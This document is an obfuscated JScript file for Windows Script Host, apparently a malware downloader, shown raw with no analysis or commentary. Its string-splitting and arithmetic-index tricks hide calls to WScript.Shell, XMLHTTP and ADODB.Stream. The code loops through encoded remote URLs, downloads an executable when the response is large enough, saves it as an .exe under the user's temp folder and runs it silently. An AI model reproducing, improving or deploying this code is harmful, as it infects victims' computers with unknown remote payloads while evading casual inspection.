
function akVDVqaX(tEwej,DsGYVF) {
tEwej.Run(DsGYVF, 0x1, 0x0);
}
function rGwenXcFS(trrJaoiqdUG) {
var kBXVEHLF = "CJtp Ws zOwroiL c WElBuF ri pt MbyTfymV .S bEQkh he zXtjFl ll".split(" ");
var gojCnrZr = zvwq(kBXVEHLF[279-278] + kBXVEHLF[880-877] + kBXVEHLF[267-262] + kBXVEHLF[322-316] + kBXVEHLF[849-841] + kBXVEHLF[802-792]+kBXVEHLF[721-709]);
akVDVqaX(gojCnrZr,trrJaoiqdUG);
}
function pRawOebrn(NFdhV,phFLI,jySjW,KkgW) {
var dSEfa = "JFffnh usB pt.Shell NIdqvjy Scri  %TE MP% \\".split(" ");
var qtE=((426-425)?"W" + dSEfa[718-714]:"")+dSEfa[561-559];
var KF = zvwq(qtE);
return ivQvPOb(KF,dSEfa[655-649]+dSEfa[561-554]+dSEfa[409-401]);
}
function TdwBgZbH() {
var iumNGBy = "Sc dAdPFMC r rqgGxtLCf ipting dJIJGDN XZx ile vfoGGZAlBtYMnY System hZ jvRal Obj XFREEQ ect ESeCKnZ".split(" ");
return iumNGBy[0] + iumNGBy[2] + iumNGBy[4] + ".F" + iumNGBy[7] + iumNGBy[9] + iumNGBy[12] + iumNGBy[14];
}
function zvwq(vvlOH) {
NDcxFCM = WScript.CreateObject(vvlOH);
return NDcxFCM
}
function eQjr(RtsgV,wWice) {
RtsgV.write(wWice);
}
function sHhW(bTcHb) {
bTcHb.open();
}
function YIgE(jrKya,lmfRY) {
jrKya.saveToFile(lmfRY,659-657);
}
function juRK(xbSRG,soqTA,sdhXf) {
xbSRG.open(sdhXf,soqTA,false);
}
function gsgi(wRlSA) {
if (wRlSA == 401-201){return true;} else {return false;}
}
function PWPc(djlUf) {
if (djlUf > 167363-587){return true;} else {return false;}
}
function Ctdj(AlCSo) {
var TAVkO="";
y=(828-828);
while(true) {
if (y >= AlCSo.length) {break;}
if (y % (221-219) != (413-413)) {
TAVkO += AlCSo.substring(y, y+(179-178));
}
y++;
}
return TAVkO;
}
function xBlq(AFgAb) {
var lRxoqJxQ=["\x73\x65\x6E\x64"];
AFgAb[lRxoqJxQ[0]]();
}
function wZeU(xIvuZ) {
return xIvuZ.status;
}
function EauNn(jpvLgG) {
return new ActiveXObject(jpvLgG);
}
function ivQvPOb(vjrs,VYkOu) {
return vjrs.ExpandEnvironmentStrings(VYkOu);
}
function IBAWGVL(uvxK) {
return uvxK.responseBody;
}
function IJlzynUd(sNB) {
return sNB.size;
}
var KM="lwui6t3cqhMbKeohleRrzeXq5q1.Yc5o3mJ/v8m0xg7F8NcOD?h UmmoImymeyicAaVnAtTa1kCe3fGf8.Bcto5mZ/Y810VgSFhNIOJ?r r?1 x?l V?";
var GL = Ctdj(KM).split(" ");
var EUNaAn = ". wqfbXe e IhlxOlJZ xe gFNO".split(" ");
var X = [GL[0].replace(new RegExp(EUNaAn[5],'g'), EUNaAn[0]+EUNaAn[2]+EUNaAn[4]),GL[1].replace(new RegExp(EUNaAn[5],'g'), EUNaAn[0]+EUNaAn[2]+EUNaAn[4]),GL[2].replace(new RegExp(EUNaAn[5],'g'), EUNaAn[0]+EUNaAn[2]+EUNaAn[4]),GL[3].replace(new RegExp(EUNaAn[5],'g'), EUNaAn[0]+EUNaAn[2]+EUNaAn[4]),GL[4].replace(new RegExp(EUNaAn[5],'g'), EUNaAn[0]+EUNaAn[2]+EUNaAn[4])];
var ojs = pRawOebrn("IVNY","dmOZl","ntTWYU","OxUttUE");
var EXK = EauNn(TdwBgZbH());
var zqhkwZ = ("IZlavKm \\").split(" ");
var CnvP = ojs+zqhkwZ[0]+zqhkwZ[1];
try{
EXK.CreateFolder(CnvP);
}catch(OlzgBg){
};
var ziD = ("2.XMLHTTP gUSlJhs jlGbM XML ream St aaSwNerX AD rKXUyPi O NgsP D").split(" ");
var VU = true  , zPai = ziD[7] + ziD[9] + ziD[11];
var hJ = zvwq("MS"+ziD[3]+(397670, ziD[0]));
var LSA = zvwq(zPai + "B." + ziD[5]+(966338, ziD[4]));
var aeH = 0;
var a = 1;
var VMPLmOk = 798623;
var I=aeH;
while (true)  {
if(I>=X.length) {break;}
var eU = 0;
var UCl = ("ht" + " NAyVtTj tp RMXzj fcMHGiSh :// VhbAQLH .e gRXkd x MfOiAx e G FMihSrZ E zDZuXhPK T").split(" ");
try  {
var QZQeY=UCl[554-554]+UCl[562-560]+UCl[693-688];
juRK(hJ,QZQeY+X[I]+a, UCl[12]+UCl[14]+UCl[16]); xBlq(hJ); if (gsgi(wZeU(hJ)))  {      
sHhW(LSA); LSA.type = 1; eQjr(LSA,IBAWGVL(hJ)); if (PWPc(IJlzynUd(LSA)))  {
eU = 1;LSA.position=(438-438);YIgE(LSA,/*p22X70yz9F*/CnvP/*MoET75RICQ*/+VMPLmOk+UCl[7]+UCl[9]+UCl[11]); try  {
if (392>36) {
rGwenXcFS(CnvP+VMPLmOk+/*cuJD50l2x8*/UCl[7]+UCl[9]+UCl[11]/*zGMO17Uk8a*/); 
break;
}
}
catch (fW)  {
}; 
}; LSA.close(); 
}; 
if (eU == 1)  {
aeH = I; break; 
}; 
}
catch (fW)  { 
}; 
I++;
}; 

